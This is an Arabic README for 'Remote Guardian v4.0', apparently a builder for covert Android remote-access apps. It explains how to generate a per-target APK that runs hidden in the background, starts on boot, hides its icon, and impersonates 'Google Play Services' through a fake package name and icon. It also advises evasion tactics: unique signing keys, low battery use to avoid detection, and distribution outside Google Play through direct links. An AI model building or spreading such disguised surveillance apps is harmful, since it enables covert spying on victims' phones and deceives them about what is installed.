# Remote Guardian v4.0 - دليل بناء تطبيقات APK والتمويه

هذا الإصدار (v4.0) ينقل النظام من مجرد سكريبتات إلى تطبيقات Android (APK) حقيقية تعمل في الخلفية مع ميزات تخفٍّ كاملة.

---

## 🚀 ميزات بناء APK (APK Builder)

تم إضافة وحدة `apk_builder.js` للخادم، والتي تتيح لك:
1.  **توليد تطبيقات مخصصة**: إنشاء ملف APK فريد لكل عميل.
2.  **تغيير الهوية**: تخصيص اسم التطبيق، أيقونته، واسم الحزمة (Package Name).
3.  **التشغيل التلقائي**: التطبيق يبدأ العمل تلقائياً عند تشغيل الهاتف (Boot Completed).
4.  **العمل في الخلفية**: العميل يعمل كخدمة Android (Background Service) دون واجهة مستخدم.

---

## 📱 العميل كخدمة Android (GhostClientService.java)

تم إعادة كتابة العميل بلغة Java ليعمل كخدمة نظام:
- **إخفاء الأيقونة**: التطبيق يغلق واجهته فور التشغيل ويستمر في العمل بالخلفية.
- **تمويه الإخطارات**: يظهر في قائمة الخدمات كـ "System Update" أو أي اسم تختاره.
- **تشفير Native**: استخدام مكتبات التشفير الخاصة بـ Android لسرعة وأمان أعلى.
- **إدارة الموارد**: استهلاك بطارية منخفض جداً لتجنب كشفه من قبل أنظمة توفير الطاقة.

---

## 🛠️ كيفية بناء APK مخصص

يمكنك استخدام وحدة البناء من خلال الخادم كالتالي:

```javascript
const APKBuilder = require('./apk_builder');
const builder = new APKBuilder();

const config = {
  clientId: 'target_device_001',
  serverUrl: 'https://your-secure-server.com',
  appName: 'Google Play Services', // اسم التمويه
  packageName: 'com.google.android.gms.update', // اسم الحزمة
  icon: './templates/icons/play_store.png' // أيقونة التمويه
};

const result = await builder.buildAPK(config);
console.log('APK جاهز للتحميل:', result.apkPath);
```

---

## 🎭 استراتيجيات التمويه (Obfuscation)

لضمان عدم كشف التطبيق:
1.  **الأسماء الموثوقة**: استخدم أسماء مثل "System Framework"، "Battery Optimizer"، أو "Google Services".
2.  **الأيقونات الرسمية**: استخدم أيقونات تشبه تطبيقات النظام الأصلية.
3.  **تغيير التوقيع**: وحدة البناء تقوم بتوليد مفتاح توقيع (Keystore) فريد لكل تطبيق.
4.  **تجنب المتجر**: لا تحاول رفع التطبيق على Google Play؛ استخدم روابط تحميل مباشرة مشفرة.

---

## ⚠️ متطلبات بناء APK على الخادم

لبناء ملفات APK، يجب توفر الأدوات التالية على الخادم:
- **Java JDK 11+**
- **Android SDK** (Build Tools & Platform Tools)
- **Gradle**
- **OpenSSL** (لتوليد الشهادات)

---

**Remote Guardian v4.0** - تحويل السكريبتات إلى تطبيقات احترافية.
